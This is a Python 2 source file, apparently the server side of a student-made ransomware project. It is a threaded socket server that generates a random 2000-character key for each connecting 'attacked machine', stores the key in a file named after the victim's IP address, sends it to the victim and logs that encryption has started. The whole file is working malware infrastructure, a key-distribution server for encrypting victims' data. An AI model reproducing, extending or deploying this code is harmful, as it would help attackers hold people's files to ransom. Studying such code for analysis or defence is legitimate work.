#!/usr/bin/python
#This program is created by Alexey Titov and Shir Bentabou
#This server will only run on a linux environment
#Try To modify it by your own

#libraries
import socket
import thread
import sys
import base64
import string
import random

#the function generate key and save to "name.key" file
def keygen(name):
	#generate key, allowing characters, digits, special characters. 
	key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase +string.digits+ '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(2000))

	#print key into file in current folder
	file = open(name+".key", "wb")
	file.write(key)
    	file.close()
    	return key

def EchoClientHandler(clientSocket, addr) :
	while 1:
		client_data  = clientSocket.recv(2048)
		if client_data :
			print client_data			
			clientSocket.send(client_data)
			#addr[0] - IP of attacked machine
			secret = keygen(addr[0])
			print "key is: " + secret
			clientSocket.send(secret)
			print clientSocket.recv(2048)
			print "encrypting started"
			clientSocket.close()
			break
		else :
			clientSocket.close()
			return



echoServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sys.argv[1] - IP , sys.argv[2]- PORT
echoServer.bind((sys.argv[1], int(sys.argv[2])))

echoServer.listen(10)

while 1:
	cSock, addr = echoServer.accept()
	# start a new thread to service 
	print "Starting new thread \n"
	print "receving from %s: %s "%(addr)
	thread.start_new_thread(EchoClientHandler, (cSock, addr))
